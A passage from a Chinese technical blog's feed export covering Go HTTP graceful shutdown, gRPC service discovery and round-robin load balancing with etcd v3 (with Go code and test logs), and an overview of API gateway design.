syscall.SIGINT, syscall.SIGKILL, syscall.SIGHUP, syscall.SIGQUIT) log.Println(&lt;-ch) // Stop the service gracefully. ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second) defer cancel() log.Println(s.Shutdown(ctx)) // Wait gorotine print shutdown message time.Sleep(time.Second * 10) log.Println("done.")&#125; 测试启动服务端, 并关注日志:1234567$go run main.go2017/08/06 16:06:47 server start at: 127.0.0.1:8080^C2017/08/06 16:07:10 interrupt2017/08/06 16:07:10 http: Server closed2017/08/06 16:07:10 server shutdown2017/08/06 16:07:11 &lt;nil&gt;2017/08/06 16:07:21 done. 使用curl发起一次请求, 在请求为结束前关闭服务1234$curl localhost:8080Hello World, 2017-08-06 16:07:11.341038687 +0800 CST$curl localhost:8080curl: (7) Failed to connect to localhost port 8080: Connection refused 从测试结果可以看出: 正在进行访问的请求不会被关闭, 继续正常响应 新增的请求则拒绝访问 因此HTTP的Shutdown的确可以起到优雅关闭服务的作用。 第三方实现官方仅仅实现了优雅的关闭, 并没有实现优雅重启, 想要实现像Nginx那样优雅重启, 还有很多工作要做, 有个不错的第三方库已经实现了该能力, 代理质量也不错, 值得使用具体可以参考Golang开发支持平滑升级（优雅重启）的HTTP服务]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gRPC服务发现和负载均衡]]></title>
    <url>%2F2017%2F08%2F02%2Fapi-gateway-service-discovery-and-lb%2F</url>
    <content type="text"><![CDATA[API网关需要实现服务的自动发现和负载均衡, 由于后面的服务基本都采用gRPC实现, 因此需要验证gRPC如何实现这2个功能。 概述构建高可用、高性能的通信服务，通常采用服务注册与发现、负载均衡和容错处理等机制实现。gRPC在设计时已有考虑, 官方也提供了一些基本实现, 但是如何围绕官方设计实现服务发现和负载均衡却并不容易, 我会围绕以下几点进行展开: 解读官方文档: Load Balancing in gRPC 负载均衡部分源码解读 代码实现,参考wonaming 官方设计官方这篇文档主要是阐述如何利用gRPC设计负载均衡。 背景值得注意的是gGRC的负载均衡是以call为基础, 而不是以连接为基础, 也就是说同一个客户端的不同请求 会被分摊到后面该服务的集群上面。 负载均衡的方法在讨论任何gRPC的细节之前, 先认识下常用负载均衡的方法: 代理模式(Proxy Model)代理模式的负载均衡机制位于服务外部, 借助其他工具实现。它一般位于消费者和服务提供者之间, 比如专门的硬件设备F5, 或者软件HAProxy,Nginx等, LB上有所有服务的地址映射表，通常由运维配置注册，当服务消费方调用某个目标服务时，它向LB发起请求，由LB以某种策略，比如轮询(Round-Robin)做负载均衡后将请求转发到目标服务。LB一般具备健康检查能力，能自动摘除不健康的服务实例。该方案的问题: 配置不方便: 基本都使用配置文件或者UI的方式操作, 并没有友好的API调用, 不方便集成 扩展性: 预留的扩展空间不足, 不能很好的根据自己的需求扩展功能, 但Nginx除外 性能损耗: 由于需要复制请求和响应, 会有一定的性能损耗, 对于存储这种重服务就不适用了 基于客户端模式(Balancing-aware Client)针对第一个方案的不足，此方案将LB的功能集成到服务消费方进程里，也被称为软负载或者客户端负载方案, 因此客户端会略现重一些, 比如客户端会包含很多调度策略(Round Robin, Random, etc)用于从server列表中挑选合适的server进行调度。 在这种模式下, 服务器列表将在客户端中静态配置, 由名称解析系统和外部负载均衡器提供, 在任何情况下, 客户端负责从列表中选取最合适的server进行调度。具体的实现过程如下: 服务提供方启动时，首先将服务地址注册到服务注册表，同时定期报心跳到服务注册表以表明服务的存活状态，相当于健康检查 服务消费方要访问某个服务时，它通过内置的LB组件向服务注册表查询，同时缓存并定期刷新目标服务地址列表，然后以某种负载均衡策略选择一个目标服务地址，最后向目标服务发起请求。LB和服务发现能力被分散到每一个服务消费者的进程内部，同时服务消费方和服务提供方之间是直接调用，没有额外开销，性能比较好。 该方案主要问题： 开发成本，编写和维护多种语言或客户端的负载均衡策略, 会有冗余, 而且也增加了开发成本和维护成本。 增加客户端复杂性，这些负载均衡策略 有可能还需要和服务端进行一些额外的通信, 比如监控状态检查, 负载信息, 它将使得客户端代码复杂化。 外部负载均衡器针对客户端过重的问题, 有了第三种方式: 复杂的调度算法独立成LB, 由外部提供。而客户端保持简单和可移植,仅实现一些基本的server挑选算法比如 Round Robin, 而客户端依赖LB提供负载均衡的配置和客户端需要发送请求的server列表, LB需要根据需要更新server列表,以平衡负载, 处理server不可用或者健康问题. 架构gRPC主要采用外部负载均衡的方式, 因gRPC实现了简单服务挑选算法: Round Robin, 同时也提供了一种外部LB算法的参考实现: grpclb, 官方并不建议 再往里面添加更多的算发, 而更多的算法需要通过外部LB提供实现。 工作流程大致如下: 服务启动后gRPC客户端向命名服务器发出名称解析请求，名称将解析为一个或多个IP地址，每个IP地址标示它是服务器地址还是负载均衡器地址，以及标示要使用那个客户端负载均衡策略或服务配置。而客户端提供的负载均衡策略有round_robin和grpclb 客户端实例化负载均衡策略，如果解析返回的地址是负载均衡器地址，则客户端将使用grpclb策略，否则客户端使用服务配置请求的负载均衡策略,如果没有从服务配置文件中解析到负载均衡策略, 则客户端会选择第一个可用的服务地址。 负载均衡策略为每个服务器地址创建一个子通道（channel）。 当有rpc请求时，负载均衡策略决定那个子通道即grpc服务器将接收请求，当可用服务器为空时客户端的请求将被阻塞。 源码解读主要看官方如何实现round robin这个负载均衡器和负载均衡工作流程。 建立连接在clientconn.go的DialContext函数中描述了客户端连接连接的过程1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// ctx: 上下文用于处理请求取消和请求超时等情况// target: 通过这个建立连接, 如果采用负载均衡模式, 他代表watcher地址, 用于watch服务端地址变化// opts: 其他建立连接时的参数func DialContext(ctx context.Context, target string, opts ...DialOption) (conn *ClientConn, err error) &#123;...... //省略go func() &#123; var addrs []Address if cc.dopts.balancer == nil &#123; //如果没有设置负载均衡器，则直接连接 addrs = append(addrs, Address&#123;Addr: target&#125;) &#125; else &#123; var credsClone credentials.TransportCredentials if creds != nil &#123; credsClone = creds.Clone() &#125; config := BalancerConfig&#123; DialCreds: credsClone, &#125; //启动一个负载均衡器,start函数会启动一个watch监听地址的变化. if err := cc.dopts.balancer.Start(target, config); err != nil &#123; waitC &lt;- err return &#125; // Notify返回一个通道，在每次服务器地址变化后的最新地址信息. ch := cc.dopts.balancer.Notify() if ch == nil &#123; // There is no name resolver installed. addrs = append(addrs, Address&#123;Addr: target&#125;) &#125; else &#123; addrs, ok = &lt;-ch if !ok || len(addrs) == 0 &#123; waitC &lt;- errNoAddr return &#125; &#125; &#125; //对每一个地址进行连接, 因为这是客户端启动时，所以需要对所有地址操作. for _, a := range addrs &#123; if err := cc.resetAddrConn(a, false, nil); err != nil &#123; waitC &lt;- err return &#125; &#125; close(waitC)&#125;().............. //省略一些代码if ok &#123; //这里开启一个监听goroutine，主要是监听服务器地址变化并对新的地址建立连接，对老的地址关闭连接 go cc.lbWatcher()&#125; 从里面可以看出关于负载均衡部分, 使用balancer的Start来启动地址监听, Notify来获取地址变化, 因此核心是理解Balancer接口。 负载均衡接口在balancer.go中有关于此的定义:123456789101112131415161718192021222324// Balancer 为RPCs选择网络地址(backend service) type Balancer interface &#123; //启动一个负载均衡，内部会启动一个名称服务器的watcher，不断监听地址的变化 Start(target string, config BalancerConfig) error // 通知Balancer gRPC通过该地址建立了一个和server的连接, 返回一个down的函数, 当连接断开或者丢失会被调用。 Up(addr Address) (down func(error)) // 获得下一次连接服务器的地址 // 1) 如果返回一个已经建立连接的地址, RPC将基于该连接直接进行调用 // 2) 如果返回一个正在连接建立中的地址(Notify初始化时发生过来的),但是还未完成连接建立，RPC调用可能会失败或者成功 // 3) 如果返回一个不存在的连接, 会当做一个错误和失败的相应的RPC // 因此如果想要实现一个自定义的Balancer, 建议遵循如下规则 // 1) 如果opts.BlockingWait为true, 需要返回一个已经建立连接的地址或者阻塞到直到有建立连接的地址时返回, 当阻塞时 // 需要检测超时或者取消该RPC // 2) 如果opts.BlockingWait为false, 它应该立即通过通知机制(Nofify)返回一个地址，而不是阻塞。 // // put用于收集和报告RPC的状态给远程的LB Get(ctx context.Context, opts BalancerGetOptions) (addr Address, put func(), err error) // 返回一个channel用于实时获取需要建立连接的地址列表, 这些地址可能来源于一个name resover或者一个remote LB, // gRPC将与之前保存的连接地址进行比较, 如果该地址列表有新增的, gRPC对新增的地址进行连接, 如果该地址有减少, gRPC会优雅关闭这 // 减少的连接, 如果没变化, gRPC无动作, 注意channel里面返回的一个 完整的地址列表, 而不是增量。 Notify() &lt;-chan []Address //关闭负载均衡器 Close() error&#125; 官方实现官方的Round Robin就是Balancer接口的一个实现, 但是在看他如何实现Start和Notify之前, 先看看名称解析服务的接口定义. 名称解析服务名称解析服务: naming.go, 该包定义了gRPC名称解析服务的API和相关数据结构12345678910111213141516171819202122232425262728293031323334353637// Operation 定义了名称解析时相应的动作.type Operation uint8const ( // Add 表示新增地址的操作 Add Operation = iota // Delete 表示需要删除一个已存在地址的操作 Delete)// Update defines a name resolution update. Notice that it is not valid having both// empty string Addr and nil Metadata in an Update.type Update struct &#123; // 具体的更新动作, 比如上面定义的Add或者Delete Op Operation // 需要更新的地址, 如果为空字符串, 表示这儿没有地址需要更新 Addr string // 用于描述updated操作时的一些meta数据, 如果是自己实现名称解析服务Metadata是不需要传入的。 Metadata interface&#123;&#125;&#125;// Resolver creates a Watcher for a target to track its resolution changes.type Resolver interface &#123; // 通过一个名字得到一个watcher，监听服务器地址变化。 Resolve(target string) (Watcher, error)&#125;// Watcher watches for the updates on the specified target.type Watcher interface &#123; // Next blocks until an update or error happens. It may return one or more // updates. The first call should get the full set of the results. It should // return an error if and only if Watcher cannot recover. // 得到下次更新的地址 Next() ([]*Update, error) // Close closes the Watcher. Close()&#125; round robin balancer在了解了名称解析服务接口过后, 看看round robin的具体实现:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899type roundRobin struct &#123; r naming.Resolver w naming.Watcher addrs []*addrInfo // 客户端应该连接的所有地址 mu sync.Mutex addrCh chan []Address // 服务地址列表更新通知channel next int // index of the next address to return for Get() waitCh chan struct&#123;&#125; // the channel to block when there is no connected address available done bool // The Balancer is closed.&#125;func (rr *roundRobin) Start(target string, config BalancerConfig) error &#123; rr.mu.Lock() defer rr.mu.Unlock() if rr.done &#123; return ErrClientConnClosing &#125; if rr.r == nil &#123; // 如果没有使用名称解析服务, 将不会进行名称解析, 在这种情况下target将会作为唯一可用的地址被放入 // rr.addrs 被客户端使用, 此时addrCh将没有地址, 始终为nil rr.addrs = append(rr.addrs, &amp;addrInfo&#123;addr: Address&#123;Addr: target&#125;&#125;) return nil &#125; // 如果名称解析服务存在将会调用名称解析服务的Resolve方法, 生成一个watcher w, err := rr.r.Resolve(target) if err != nil &#123; return err &#125; rr.w = w rr.addrCh = make(chan []Address) // 启一个Goroutine来专门更新地址到addrCh go func() &#123; for &#123; if err := rr.watchAddrUpdates(); err != nil &#123; return &#125; &#125; &#125;() return nil&#125;func (rr *roundRobin) watchAddrUpdates() error &#123; // 获取需要更新的地址 updates, err := rr.w.Next() if err != nil &#123; grpclog.Printf("grpc: the naming watcher stops working due to %v.\n", err) return err &#125; rr.mu.Lock() defer rr.mu.Unlock() for _, update := range updates &#123; addr := Address&#123; Addr: update.Addr, Metadata: update.Metadata, &#125; switch update.Op &#123; // 如果地址没有重复, 则添加到地址列表中去(rr.addrs) case naming.Add: var exist bool for _, v := range rr.addrs &#123; if addr == v.addr &#123; exist = true grpclog.Println("grpc: The name resolver wanted to add an existing address: ", addr) break &#125; &#125; if exist &#123; continue &#125; rr.addrs = append(rr.addrs, &amp;addrInfo&#123;addr: addr&#125;) // 从地址列表中(rr.addrs)移除已经存在的地址 case naming.Delete: for i, v := range rr.addrs &#123; if addr == v.addr &#123; copy(rr.addrs[i:], rr.addrs[i+1:]) rr.addrs = rr.addrs[:len(rr.addrs)-1] break &#125; &#125; default: grpclog.Println("Unknown update.Op ", update.Op) &#125; &#125; // Make a copy of rr.addrs and write it onto rr.addrCh so that gRPC internals gets notified. open := make([]Address, len(rr.addrs)) for i, v := range rr.addrs &#123; open[i] = v.addr &#125; if rr.done &#123; return ErrClientConnClosing &#125; rr.addrCh &lt;- open return nil&#125;// 直接返回地址变更的channel(注意地址不是增量是全量)func (rr *roundRobin) Notify() &lt;-chan []Address &#123; return rr.addrCh&#125; 代码实现根据gRPC官方提供的设计思路，基于进程内LB方案(即第2个案，阿里开源的服务框架 Dubbo 也是采用类似机制)，结合分布式一致的组件（如Zookeeper、Consul、Etcd），可找到gRPC服务发现和负载均衡的可行解决方案。根据官方已经实现Round Robin负载均衡器, 我们可以通过实现一个名字服务器的接口，然后封装到这个负载均衡器中，这样就不需要自己实现整个负载均衡器。接下来我们结合etcdv3实现一个名词解析服务, 完整示例代理: gRPC LB示例代码 实现名称解析服务 首先定义一个resolver, resolver要求返回一个实现了watcher接口的对象, 而watcher需要有服务名称和etcd客户端才能解析出真正的服务地址: resolver.go 123456789101112131415161718192021222324252627282930313233343536373839package lbimport ( "errors" "fmt "strings" etcd3 "github.com/coreos/etcd/clientv3" "google.golang.org/grpc/naming")// resolver is the implementaion of grpc.naming.Resolvertype resolver struct &#123; serviceName string // service name to resolve&#125;// NewResolver return resolver with service namefunc NewResolver(serviceName string) *resolver &#123; return &amp;resolver&#123;serviceName: serviceName&#125;&#125;// Resolve to resolve the service from etcd, target is the dial address of etcd// target example: "http://127.0.0.1:2379,http://127.0.0.1:12379,http://127.0.0.1:22379"func (re *resolver) Resolve(target string) (naming.Watcher, error) &#123; if re.serviceName == "" &#123; return nil, errors.New("grpclb: no service name provided") &#125; // generate etcd client client, err := etcd3.New(etcd3.Config&#123; Endpoints: strings.Split(target, ","), &#125;) if err != nil &#123; return nil, fmt.Errorf("grpclb: creat etcd3 client failed: %s", err.Error()) &#125; // Return watcher return &amp;watcher&#123;re: re, client: *client&#125;, nil&#125; watcher持有服务名称和etcd客户端,仅需要调用etcd客户端查出该服务的地址列表即可, 接下来我们利用etcd实现一个watcher(实现Next和Colse方法): watcher.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package lbimport ( "fmt" etcd3 "github.com/coreos/etcd/clientv3" "golang.org/x/net/context" "google.golang.org/grpc/naming" "github.com/coreos/etcd/mvcc/mvccpb")// watcher is the implementaion of grpc.naming.Watchertype watcher struct &#123; re *resolver // re: Etcd Resolver client etcd3.Client isInitialized bool&#125;// Close do nothingfunc (w *watcher) Close() &#123;&#125;// Next to return the updatesfunc (w *watcher) Next() ([]*naming.Update, error) &#123; // prefix is the etcd prefix/value to watch prefix := fmt.Sprintf("/%s/%s/", Prefix, w.re.serviceName) // check if is initialized // 第一次及初始化时需要返回一个全量的地址用于更新 if !w.isInitialized &#123; // query addresses from etcd resp, err := w.client.Get(context.Background(), prefix, etcd3.WithPrefix()) w.isInitialized = true if err == nil &#123; addrs := extractAddrs(resp) //if not empty, return the updates or watcher new dir if l := len(addrs); l != 0 &#123; updates := make([]*naming.Update, l) for i := range addrs &#123; updates[i] = &amp;naming.Update&#123;Op: naming.Add, Addr: addrs[i]&#125; &#125; return updates, nil &#125; &#125; &#125; // generate etcd Watcher // 初始化后 监听变量即可 rch := w.client.Watch(context.Background(), prefix, etcd3.WithPrefix()) for wresp := range rch &#123; for _, ev := range wresp.Events &#123; switch ev.Type &#123; case mvccpb.PUT: return []*naming.Update&#123;&#123;Op: naming.Add, Addr: string(ev.Kv.Value)&#125;&#125;, nil case mvccpb.DELETE: return []*naming.Update&#123;&#123;Op: naming.Delete, Addr: string(ev.Kv.Value)&#125;&#125;, nil &#125; &#125; &#125; return nil, nil&#125;func extractAddrs(resp *etcd3.GetResponse) []string &#123; addrs := []string&#123;&#125; if resp == nil || resp.Kvs == nil &#123; return addrs &#125; for i := range resp.Kvs &#123; if v := resp.Kvs[i].Value; v != nil &#123; addrs = append(addrs, string(v)) &#125; &#125; return addrs&#125; 实现服务的注册名称解析做完了, 需要服务将地址注册到etcd相应的地址下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package lbimport ( "fmt" "log" "strings" "time" etcd3 "github.com/coreos/etcd/clientv3" "github.com/coreos/etcd/etcdserver/api/v3rpc/rpctypes" "golang.org/x/net/context")// Prefix should start and end with no slashvar Prefix = "etcd3_naming"var client etcd3.Clientvar serviceKey stringvar stopSignal = make(chan bool, 1)// Registerfunc Register(name string, host string, port int, target string, interval time.Duration, ttl int) error &#123; serviceValue := fmt.Sprintf("%s:%d", host, port) serviceKey = fmt.Sprintf("/%s/%s/%s", Prefix, name, serviceValue) // get endpoints for register dial address var err error client, err := etcd3.New(etcd3.Config&#123; Endpoints: strings.Split(target, ","), &#125;) if err != nil &#123; return fmt.Errorf("grpclb: create etcd3 client failed: %v", err) &#125; go func() &#123; // invoke self-register with ticker ticker := time.NewTicker(interval) for &#123; // minimum lease TTL is ttl-second resp, _ := client.Grant(context.TODO(), int64(ttl)) // 如果第一次注册该key将不存在, 需要建立key, 如果不是第一次注册, 则刷新该key的值 _, err := client.Get(context.Background(), serviceKey) if err != nil &#123; if err == rpctypes.ErrKeyNotFound &#123; if _, err := client.Put(context.TODO(), serviceKey, serviceValue, etcd3.WithLease(resp.ID)); err != nil &#123; log.Printf("grpclb: set service '%s' with ttl to etcd3 failed: %s", name, err.Error()) &#125; &#125; else &#123; log.Printf("grpclb: service '%s' connect to etcd3 failed: %s", name, err.Error()) &#125; &#125; else &#123; // refresh set to true for not notifying the watcher if _, err := client.Put(context.Background(), serviceKey, serviceValue, etcd3.WithLease(resp.ID)); err != nil &#123; log.Printf("grpclb: refresh service '%s' with ttl to etcd3 failed: %s", name, err.Error()) &#125; &#125; select &#123; case &lt;-stopSignal: return case &lt;-ticker.C: &#125; &#125; &#125;() return nil&#125;// UnRegister delete registered service from etcdfunc UnRegister() error &#123; stopSignal &lt;- true stopSignal = make(chan bool, 1) // just a hack to avoid multi UnRegister deadlock var err error if _, err := client.Delete(context.Background(), serviceKey); err != nil &#123; log.Printf("grpclb: deregister '%s' failed: %s", serviceKey, err.Error()) &#125; else &#123; log.Printf("grpclb: deregister '%s' ok.", serviceKey) &#125; return err&#125; 实现服务端和客户端 定义服务接口契约: hello.proto 12345678910111213141516171819202122232425syntax = &quot;proto3&quot;;option java_multiple_files = true;option java_package = &quot;com.midea.jr.test.grpc&quot;;option java_outer_classname = &quot;HelloWorldProto&quot;;option objc_class_prefix = &quot;HLW&quot;;package helloworld;// The greeting service definition.service Greeter &#123; // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) &#123; &#125;&#125;// The request message containing the user&apos;s name.message HelloRequest &#123; string name = 1;&#125;// The response message containing the greetingsmessage HelloReply &#123; string message = 1;&#125; 服务端启动时需要注册 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package mainimport ( "flag" "fmt" "log" "net" "os" "os/signal" "syscall" "time" "golang.org/x/net/context" "google.golang.org/grpc" pb "golang/grpc/example/pb" grpclb "golang/grpc/lb")var ( serv = flag.String("service", "hello_service", "service name") port = flag.Int("port", 50001, "listening port") reg = flag.String("reg", "http://192.168.204.7:2379", "register etcd address"))func main() &#123; flag.Parse() lis, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *port)) if err != nil &#123; panic(err) &#125; err = grpclb.Register(*serv, "127.0.0.1", *port, *reg, time.Second*10, 15) if err != nil &#123; panic(err) &#125; ch := make(chan os.Signal, 1) signal.Notify(ch, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGHUP, syscall.SIGQUIT) go func() &#123; s := &lt;-ch log.Printf("receive signal '%v'", s) grpclb.UnRegister() os.Exit(1) &#125;() log.Printf("starting hello service at %d", *port) s := grpc.NewServer() pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) s.Serve(lis)&#125;// server is used to implement helloworld.GreeterServer.type server struct&#123;&#125;// SayHello implements helloworld.GreeterServerfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) &#123; fmt.Printf("%v: Receive is %s\n", time.Now(), in.Name) return &amp;pb.HelloReply&#123;Message: "Hello " + in.Name&#125;, nil&#125; 客户端使用round robin负载均衡器 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( "flag" "fmt" "time" pb "golang/grpc/example/pb" grpclb "golang/grpc/lb" "strconv" "golang.org/x/net/context" "google.golang.org/grpc")var ( serv = flag.String("service", "hello_service", "service name") reg = flag.String("reg", "http://192.168.204.7:2379", "register etcd address"))func main() &#123; flag.Parse() r := grpclb.NewResolver(*serv) b := grpc.RoundRobin(r) ctx, _ := context.WithTimeout(context.Background(), 10*time.Second) conn, err := grpc.DialContext(ctx, *reg, grpc.WithInsecure(), grpc.WithBalancer(b)) if err != nil &#123; panic(err) &#125; ticker := time.NewTicker(1 * time.Second) for t := range ticker.C &#123; client := pb.NewGreeterClient(conn) resp, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;Name: "world " + strconv.Itoa(t.Second())&#125;) if err == nil &#123; fmt.Printf("%v: Reply is %s\n", t, resp.Message) &#125; &#125;&#125; 测试启动3个服务端123456$go run main.go -port 500012017/08/05 10:57:20 starting hello service at 500012017-08-05 11:02:00.81258994 +0800 CST: Receive is world 02017-08-05 11:02:03.812191776 +0800 CST: Receive is world 32017-08-05 11:02:06.812970792 +0800 CST: Receive is world 62017-08-05 11:02:09.809401404 +0800 CST: Receive is world 9 123456$go run main.go -port 500022017/08/05 10:58:13 starting hello service at 500022017-08-05 11:02:01.812108579 +0800 CST: Receive is world 12017-08-05 11:02:04.811493797 +0800 CST: Receive is world 42017-08-05 11:02:07.808267481 +0800 CST: Receive is world 72017-08-05 11:02:10.808644591 +0800 CST: Receive is world 10 123456$go run main.go -port 500032017/08/05 10:58:42 starting hello service at 500032017-08-05 11:02:02.811818858 +0800 CST: Receive is world 22017-08-05 11:02:05.812063511 +0800 CST: Receive is world 52017-08-05 11:02:08.812688805 +0800 CST: Receive is world 82017-08-05 11:02:11.811770723 +0800 CST: Receive is world 11 启动客户端12345678910111213 $go run main.go2017-08-05 11:02:00.812164403 +0800 CST: Reply is Hello world 02017-08-05 11:02:01.811569222 +0800 CST: Reply is Hello world 12017-08-05 11:02:02.811516841 +0800 CST: Reply is Hello world 22017-08-05 11:02:03.811806037 +0800 CST: Reply is Hello world 32017-08-05 11:02:04.811077475 +0800 CST: Reply is Hello world 42017-08-05 11:02:05.811687449 +0800 CST: Reply is Hello world 52017-08-05 11:02:06.812519507 +0800 CST: Reply is Hello world 62017-08-05 11:02:07.807912824 +0800 CST: Reply is Hello world 72017-08-05 11:02:08.812355134 +0800 CST: Reply is Hello world 82017-08-05 11:02:09.809015778 +0800 CST: Reply is Hello world 92017-08-05 11:02:10.808287335 +0800 CST: Reply is Hello world 102017-08-05 11:02:11.81142561 +0800 CST: Reply is Hello world 11 最后我们看看etcd里面我们注册的服务:1234567root@etcd-node01:~# etcdctl get --prefix --endpoints=192.168.204.7:2379 "/etcd3_naming"/etcd3_naming/hello_service/127.0.0.1:50001127.0.0.1:50001/etcd3_naming/hello_service/127.0.0.1:50002127.0.0.1:50002/etcd3_naming/hello_service/127.0.0.1:50003127.0.0.1:50003 剩下了停掉一些服务,客户端是否正常就你们自己测试了。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gRPC</tag>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务之API Gateway]]></title>
    <url>%2F2017%2F08%2F01%2Fapi-gateway%2F</url>
    <content type="text"><![CDATA[微服务架构中那些单体微服务关注与自身领域, 而APIGateway关注服务全貌, 所以他是一个统筹者, 很多全局都需要的功能需要在APIGateway处进行实现, 这篇文章是设计一个API Gateway的概述, 讲述API网关的需求、价值、以及设计要求。 SOA设计方法SOA是一种架构的设计方法, 全称是Service-Oriented Architecture(面向服务的架构)，它将应用程序的不同功能单元拆解成独立的服务, 多个服务直接通过良好的接口和契约联系起来,采用网络进行通信。 SOA可以让软件架构达到松耦合, 可以用来应对臃肿的单体应用, 比如多个终端用户应用程序可以共享同一个服务, 它的目标是在不影响其他任何人的情况下透明地替换一个服务,只要替换之后的服务的外部接口没有太大的变化即可。这种性质能够大大简化软件维护甚至是软件重写的过程。 仅仅达到松耦合是不够的, 松耦合会带来复杂性问题, 因此同时也需要高内聚, API网关就是用来做这个的, 因此对外采用高内聚的表现形式来降低复杂性, 对内采用松耦合的实现方式来应对快速变化的需求。 背景介绍API网关的流行，源于近几年来，移动应用与企业间互联需求的兴起。移动应用、企业互联，使得后台服务支持的对象，从以前单一的Web应用，扩展到多种使用场景，且每种使用场景对后台服务的要求都不尽相同。这不仅增加了后台服务的响应量，还增加了后台服务的复杂性。随着微服务架构概念的提出，API网关成为了微服务架构的一个标配组件。 它用于处理很多通用的问题, 比如访问认证、报文转换、访问统计、服务发现、限流等等。 使用场景王延炯在谈API网关的背景、架构以及落地方案有如下5种场景介绍: 面向Web App的网关这类场景，在物理形态上类似前后端分离，此时的Web App已经不是全功能的Web App，而是根据场景定制、场景化的App。 面向MobileApp的网关这类场景，移动App是后端Service的使用者，此时的APIGW还需要承担一部分MDM（此处是指移动设备管理，不是主数据管理）的职能。 面向PartnerOpenAPI的网关这类场景，主要为了满足业务形态对外开放，与企业外部合作伙伴建立生态圈，此时的API GW需要增加配额、流控、令牌等一系列安全管控功能。 面向PartnerExternalAPI的网关这类场景，主要是为了满足企业自身业务的需要，实现对企业自有业务的映射。一个典型的例子就是使用「合作方账号登录」、「使用第三方支付平台支付」等等。此时的APIGW就需要在边界上，为企业内部Service 统一调用外部的API做统一的认证、授权、以及访问控制。 面向IoTSmartDevice的网关这类场景主要在传统企业，尤其是工业企业，传感器、物理设备从工业控制协议向IP转换，导致物理链路上会存在一部分公网链路。此时的API GW所需要满足的「内外兼修」的双向数据流，设备一般通过一个「客户侧」的集中网关在和企业的接入网关进行通信。 在我们讲的微服务架构下的API网关，一般指的是前两种使用场景。即，主要是把企业内部的API能力，暴露给其他应用或合作伙伴使用。 网关的价值网关层作为客户端与服务端的一层挡板，主要起到了三大类作用: 内外隔离: 强调安全性, 企业系统的边界,隔离外网环境和内网环境。 服务解耦: 有了网关和服务层的解耦, 使得微服务系统的各方能够独立、自由、高效、灵活地调整，而不用担心给其他方面带来影响, 便于各个团队工作的独立性。 辅助功能: 提供了一个地点，方便通过扩展机制对请求进行一系列加工和处理。 内外隔离企业为了保护内部系统的安全性，内网与外网都是隔离的，企业的服务应用都是运行在内网环境中，为了安全的考量，一般都不允许外部直接访问。API网关部署在防火墙外面，起到一层挡板作用，内部系统只接受API网关转发过来的请求。网关通过白名单或校验规则，对访问进行了初步的过滤。相比防火墙，这种软件实现的过滤规则，更加动态灵活。在安全的角度而言, 此时网关充当着应用防火墙的作用(WAF)。 服务解耦在微服务架构下，整个环境包括服务的提供者、服务的消费者、服务运维人员、安全管理人员等，每个角色的职责和述求都不同。例如：服务消费者已经需要提出一些新的服务需求，以快速应对业务变化；服务提供者，作为业务服务的沉淀方，希望保持服务的通用性与稳定性，很难应对快速的变化。有了API网关这一层，可以很好的解耦各方的相互依赖关系，让各方更加专注自己的目标。 解耦功能与非功能企业在把服务提供给外部访问时，除了实现业务逻辑功能外，还面临许多非功能性的要求。例如：需要防范黑客攻击，需要应对突发的访问量、需要确认用户的权限，需要对访问进行监控等。这些非功能逻辑，不能与业务逻辑的开发混在一起，需要有专业的人员甚至专业的团队来处理。 解耦客户端与服务提供者客户端与服务提供者分属于不同的团队，工作性质要求也不相同。对于服务提供者来说，他主要的职责是对业务进行抽象，提供可复用的业务功能，他们需要对业务模型进行深入的思考和沉淀，不能轻易为了响应外部的需求而破坏业务模型的稳定性。而业务的快速变化，又要求企业快速提供接口来满足客户端需求。这就需要一个中间层，来对服务层的接口进行封装，以及时响应客户端的需求。通过解耦，服务层可以使用统一的接口、协议和报文格式来暴露服务，而不必考虑客户端的多种形态。那么 网关层是否需要实现服务的编排？在介绍API网关的一些文章中，提到了网关层的服务编排能力。从解耦的角度出发，服务的编排不适合在网关层进行。对服务的编排，其实是提供了一种业务能力，如果把服务的编排放在了网关层，实际上是把一部分业务能力放在了网关层，这样一来，服务层、网关层都有一些业务能力，造成团队职责的不清，也不利于业务能力的沉淀。 辅助功能网关层除了请求的路由、转发外，还需要负责安全、鉴权、限流、监控等。这些功能的实现方式，往往随着业务的变化不断调整。例如权限控制方面，早期可能只需要简单的用户+密码方式，后续用户量大了后，可能会使用高性能的第三方解决方案。又例如，针对不同的监控方案，需要记录不同的日志文件。所以，这些能力不能一开始就固化在网关平台上，而应该是一种可配置的方式，便于修改和替换。这就要求网关层提供一套机制，可以很好地支持这种动态扩展。 总结有了API网关后, 会有以下优点 网关层对外部和内部进行了隔离，保障了后台服务的安全性。 对外访问控制由网络层面转换成了运维层面，减少变更的流程和错误成本 减少客户端与服务的耦合，服务可以独立发展。通过网关层来做映射。 通过网关层聚合，减少外部访问的频次，提升访问效率。 节约后端服务开发成本，减少上线风险。 为服务熔断，灰度发布，线上测试提供简单方案。 便于扩展。 设计要求那么API网关在设计时需要考虑到那些点喃？ 高性能网关作为应用访问的唯一入口, 所有的请求都会经过API网关进行转发, 可想而知, 对API网关的访问压力是巨大的。因此API网关对性能要求比较高, 性能上至少不能比nginx弱太多, 因此业内使用nginx + lua的比较多。 高可用API网关作为逻辑上的单点，一旦发生问题，将造成所有服务的不可用，对企业来说可能造成的致命的影响。计算短时间的不可用，也会给企业带来直接的经济损失。所以，如何保证API网关的7*24小时的稳定运行, 因此 